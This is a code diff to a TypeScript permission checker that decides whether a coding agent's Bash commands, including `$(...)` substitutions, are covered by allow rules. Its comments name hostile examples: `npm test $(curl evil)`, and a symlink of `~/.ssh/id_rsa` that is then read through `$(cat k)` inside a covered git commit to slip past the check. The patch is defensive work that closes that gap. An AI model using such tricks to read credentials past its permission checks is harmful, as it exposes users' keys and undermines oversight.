@@ -405,7 +405,10 @@ export function isShellTool(toolName: string): boolean {
  * by a rule, or, for the whole substitution at once, by `readOnly` (the
  * auto-mode pre-gate's proof that it reads only inside the working directory
  * and writes nothing). So `Bash(git commit:*)` covers `git commit -m "$(cat
- * <<'EOF' … EOF)"` but not `npm test $(curl evil)`. A top-level command
+ * <<'EOF' … EOF)"` but not `npm test $(curl evil)`. The proof clears a
+ * substitution only under the order described below for a top-level command,
+ * counted from the command around it (`ln -sf ~/.ssh/id_rsa k && git commit
+ * -m "$(cat k)"` needs a rule for `cat`). A top-level command
  * the same check proves read-only by itself needs no rule either
  * (`Bash(gh api *)` covers `gh api x --jq y | head`), provided a rule covers
  * at least one other command and no command a rule covers reads its output
@@ -500,11 +503,42 @@ export function findBashAllowRule(
 		const afterUnproven = segmentRules.slice(0, index).some((rule, before) => rule !== undefined && !readOnlyAt(before));
 		if (afterUnproven && !(seg.scopes.some((scope) => laterStages.has(scope)) && opts.readsNoFile?.(seg.raw))) return undefined;
 	}
+	// Each outermost substitution, by the top-level command it computes a word
+	// of: the last one that starts before it (segments are in source order, and
+	// a command starts before its own substitutions). A later command than the
+	// true one only counts more commands as running first.
+	const containerOf = (index: number): number => {
+		const at = parsed.segments.findIndex((seg) => seg.substitution === index);
+		let container = topLevel.length;
+		for (const [position, seg] of parsed.segments.entries()) {
+			if (position >= at) break;
+			if (seg.substitution === undefined && seg.raw.length > 0) container = topLevel.indexOf(seg);
+		}
+		return container;
+	};
+	// The top-level commands that run alongside the one at `index`: the other
+	// members of its pipelines.
+	const alongside = (index: number): number[] => {
+		const members = new Set(parsed.pipelines.filter((pipeline) => pipeline.some((scope) => topLevel[index]?.scopes.includes(scope))).flat());
+		return topLevel.flatMap((seg, other) => (other > index && seg.scopes.some((scope) => members.has(scope)) ? [other] : []));
+	};
+	const innerOf = parsed.substitutions.map((_, index) => parsed.segments.filter((seg) => seg.substitution === index));
+	const byRule = innerOf.map((inner) => inner.every((seg) => ruleFor(seg.raw)));
 	for (const [index, text] of parsed.substitutions.entries()) {
-		const inner = parsed.segments.filter((seg) => seg.substitution === index);
-		if (inner.every((seg) => ruleFor(seg.raw))) continue;
-		if (!proofOff && opts.readOnly?.(text)) continue;
-		return undefined;
+		if (byRule[index]) continue;
+		// The proof clears a substitution only under the same order as a
+		// top-level command: no ruled command the proof could not clear runs
+		// before the command around it, or alongside it in its pipeline (`ln -sf
+		// ~/.ssh/id_rsa k && git commit -m "$(cat k)"` is not covered), nor does
+		// a substitution a rule cleared in that same command (`git commit -m
+		// "$(ln -sf …)" -F "$(cat k)"`).
+		if (proofOff || !opts.readOnly?.(text)) return undefined;
+		const container = containerOf(index);
+		const unproven = (other: number) => segmentRules[other] !== undefined && !readOnlyAt(other);
+		if ([...segmentRules.keys()].slice(0, container).some(unproven) || alongside(container).some(unproven)) return undefined;
+		for (const [other, otherText] of parsed.substitutions.entries()) {
+			if (other !== index && byRule[other] && containerOf(other) === container && !opts.readOnly(otherText)) return undefined;
+		}
 	}
 	return first;
 }
